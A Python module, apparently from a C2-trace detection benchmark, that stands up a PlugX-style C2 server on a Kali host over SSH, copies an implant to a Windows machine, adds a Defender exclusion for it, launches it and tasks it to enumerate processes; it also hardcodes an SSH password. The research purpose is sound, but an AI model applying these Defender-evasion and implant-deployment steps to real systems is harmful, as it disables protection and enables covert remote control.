"""PlugX phase runners for bench_v4 AEL-MUSTANG-PANDA-PLUGX-001."""
from __future__ import annotations
import base64, json, os, subprocess, time, shutil
from datetime import datetime, timezone
from typing import Any, Callable, Mapping
from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (
    CalderaBootstrapPhaseResult, CalderaScenarioPhaseResult,
    CalderaTargetCandidate, BenchV4RuntimeError,
    RuntimeCase, RuntimeValues,
    deterministic_runtime_source_id, verify_deployment_manifest,
)
from .runtime import find_driver_agent

__all__ = [
    "run_plugx_bootstrap_phase",
    "resolve_plugx_target_phase",
    "run_plugx_scenario_phase",
]

KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
KALI_SSH_PASSWORD = os.environ.get("C2TRACE_KALI_SSH_PASSWORD", "20010808zzk")
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]

C2SERVER_PORT = 18451
C2SERVER_DIR = "/tmp/c2trace-plugx"
C2SERVER_SCRIPT = f"{C2SERVER_DIR}/plugx_c2server.py"
C2SERVER_LOG = f"{C2SERVER_DIR}/server.log"
C2SERVER_RESULTS = f"{C2SERVER_DIR}/results.log"
C2_URL = f"http://{KALI_IP}:{C2SERVER_PORT}"

_IMPLANT_SOURCE = os.path.join(
    os.environ.get("C2TRACE_ROOT", r"C:\Users\LAB_USER\lunwen\C2Trace"),
    "src", "c2trace", "bench_v4", "plugx_implant.py",
)


def _ssh_run_py(script: str, timeout: float = 120) -> str:
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SSH python failed: {result.stderr}")
    return result.stdout


def _start_c2server() -> None:
    check = _ssh_run_py(
        "import subprocess; r = subprocess.run(['pgrep', '-f', 'plugx_c2server'], "
        "capture_output=True, text=True); print(r.stdout.strip())",
        timeout=15,
    )
    if check.strip():
        return
    _ssh_run_py(
        "import subprocess, time\n"
        "subprocess.Popen(\n"
        "    ['python3', '" + C2SERVER_SCRIPT + "'],\n"
        "    cwd='" + C2SERVER_DIR + "',\n"
        "    stdout=open('" + C2SERVER_LOG + "', 'w'),\n"
        "    stderr=subprocess.STDOUT,\n"
        "    stdin=subprocess.DEVNULL,\n"
        "    start_new_session=True,\n"
        ")\n"
        "time.sleep(3)\n"
        "r = subprocess.run(['pgrep', '-f', 'plugx_c2server'], capture_output=True, text=True)\n"
        "print('RUNNING:', r.stdout.strip())",
        timeout=30,
    )
    check2 = _ssh_run_py(
        "import subprocess; r = subprocess.run(['pgrep', '-f', 'plugx_c2server'], "
        "capture_output=True, text=True); print(r.stdout.strip())",
        timeout=15,
    )
    if not check2.strip():
        log = _ssh_run_py(
            "try:\n    print(open('" + C2SERVER_LOG + "').read())\n"
            "except Exception as e:\n    print('NOLOG:', e)",
            timeout=15,
        )
        raise BenchV4RuntimeError(f"plugx c2server failed to start. Log: {log}")


def _copy_implant_to_windows(victim_path: str) -> str:
    shutil.copy2(_IMPLANT_SOURCE, victim_path)
    return victim_path


def _add_defender_exclusion(path: str) -> None:
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _execute_implant(path: str, server_url: str) -> int:
    # Use system Python directly to avoid venv launcher PID mismatch
    import os as _os
    py_exe = _os.environ.get("C2TRACE_SYSTEM_PYTHON", r"C:\Users\LAB_USER\AppData\Local\Programs\Python\Python311\python.exe")
    if not _os.path.isfile(py_exe):
        import sys as _sys2
        py_exe = _sys2.executable
    proc = subprocess.Popen(
        [py_exe, path, server_url],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
    )
    return proc.pid


def _get_sessions():
    import urllib.request
    try:
        r = urllib.request.urlopen(
            f"http://{KALI_IP}:{C2SERVER_PORT}/api/v1.0/sessions", timeout=10)
        data = json.loads(r.read())
        return data if isinstance(data, list) else []
    except Exception:
        return []


def _wait_for_callback(timeout: float = 120, poll: float = 3.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _get_sessions():
            return True
        time.sleep(poll)
    return False


def _discover_session_guid(timeout: float = 30, poll: float = 3.0) -> str:
    deadline = time.time() + timeout
    while time.time() < deadline:
        sessions = _get_sessions()
        if sessions:
            guid = sessions[0].get("guid") or sessions[0].get("data", {}).get("guid", "")
            if guid:
                return guid
        time.sleep(poll)
    raise BenchV4RuntimeError("no PlugX session discovered")


def _set_task(guid: str, task: str) -> None:
    import urllib.request
    url = f"http://{KALI_IP}:{C2SERVER_PORT}/api/v1.0/task/{guid}"
    req = urllib.request.Request(url, data=task.encode(), method="POST")
    urllib.request.urlopen(req, timeout=10)


def _wait_for_output(guid: str, timeout: float = 90, poll: float = 3.0) -> bool:
    import urllib.request
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = urllib.request.urlopen(
                f"http://{KALI_IP}:{C2SERVER_PORT}/api/v1.0/task/output/{guid}",
                timeout=10)
            output = r.read().decode().strip()
            if output and len(output) > 5 and "not found" not in output.lower():
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


def _synthetic_operation(run_id, role):
    return {
        "id": f"synthetic-{run_id}-{role}",
        "name": f"AEL-MUSTANG-PANDA-PLUGX-001 {role} ({run_id})",
        "state": "finished",
        "platform": "windows" if role == "bootstrap" else "linux",
        "group": "c2t-control" if role == "bootstrap" else "c2t-driver",
        "start": datetime.now(timezone.utc).isoformat(),
        "finish": "",
        "autonomous": 0,
    }


def _synthetic_link(run_id, role, ability_id):
    return {
        "id": f"synthetic-{run_id}-{role}-link",
        "ability": {"ability_id": ability_id},
        "status": 0,
        "command": "plugx_deploy" if role == "bootstrap" else "plugx_enum_processes",
        "host": "DESKTOP-G9IIQ2P",
        "pid": None,
    }


def run_plugx_bootstrap_phase(client, runtime, values, *, operation_timeout=360.0,
                               poll_seconds=3.0, event_sink=None, failure_artifact_sink=None):
    if event_sink:
        event_sink("plugx_bootstrap_start", {"run_id": values.run_id})
    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)

    _start_c2server()
    implant_path = values.target_path
    _copy_implant_to_windows(implant_path)
    _add_defender_exclusion(implant_path)
    implant_pid = _execute_implant(implant_path, C2_URL)
    time.sleep(12)
    callback_ok = _wait_for_callback(timeout=operation_timeout, poll=poll_seconds)
    if not callback_ok:
        raise BenchV4RuntimeError("PlugX implant did not call back to C2 server")
    session_guid = _discover_session_guid(timeout=30, poll=3.0)

    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)

    if event_sink:
        event_sink("plugx_bootstrap_complete", {
            "implant_path": implant_path, "implant_pid": implant_pid,
            "session_guid": session_guid, "c2_port": C2SERVER_PORT,
        })

    return CalderaBootstrapPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=verified.manifest_sha256,
        runtime_source_id=runtime_source_id,
        install_receipt={"synthetic": True, "implant_path": implant_path,
                          "implant_pid": implant_pid, "session_guid": session_guid},
        runtime_source={"id": runtime_source_id, "name": "c2trace_plugx_runtime_source"},
        control_agent=dict(control),
        driver_agent=dict(driver) if driver else None,
        baseline_paws=baseline_paws,
        started_at_utc=started,
        bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"),
        bootstrap_links=(bootstrap_link,),
        bootstrap_report={"state": "finished", "outcome": "implant_deployed"},
        bootstrap_event_logs=(),
    )


def resolve_plugx_target_phase(client, runtime, values, bootstrap, *,
                                timeout_seconds=360.0, poll_seconds=3.0):
    implant_pid = 0
    session_guid = ""
    receipt = bootstrap.install_receipt
    if isinstance(receipt, Mapping):
        implant_pid = int(receipt.get("implant_pid") or 0)
        session_guid = str(receipt.get("session_guid") or "")
    raw_identity = {"pid": implant_pid, "path": values.target_path,
                    "host": "DESKTOP-G9IIQ2P", "c2_port": C2SERVER_PORT,
                    "session_guid": session_guid}
    return CalderaTargetCandidate(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        raw_identity=raw_identity,
        scenario_paw=agent_paw(bootstrap.control_agent),
    )


def run_plugx_scenario_phase(client, runtime, values, bootstrap, candidate,
                              frozen_identity, *, operation_timeout=360.0,
                              poll_seconds=3.0, event_sink=None,
                              failure_artifact_sink=None):
    if event_sink:
        event_sink("plugx_scenario_start", {"implant_pid": candidate.raw_identity.get("pid")})
    receipt = bootstrap.install_receipt
    session_guid = ""
    if isinstance(receipt, Mapping):
        session_guid = str(receipt.get("session_guid") or "")
    if not session_guid:
        session_guid = _discover_session_guid(timeout=30, poll=3.0)
    _set_task(session_guid, "enum_processes")
    time.sleep(15)
    output_ok = _wait_for_output(guid=session_guid, timeout=operation_timeout, poll=poll_seconds)
    if not output_ok:
        raise BenchV4RuntimeError("PlugX process enumeration task output not received")

    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)

    if event_sink:
        event_sink("plugx_scenario_complete", {"outcome": "enum_processes_completed"})

    return CalderaScenarioPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        target_identity=dict(frozen_identity),
        scenario_operation=_synthetic_operation(values.run_id, "scenario"),
        scenario_links=(scenario_link,),
        scenario_report={"state": "finished", "outcome": "enum_processes_completed"},
        scenario_event_logs=(),
    )
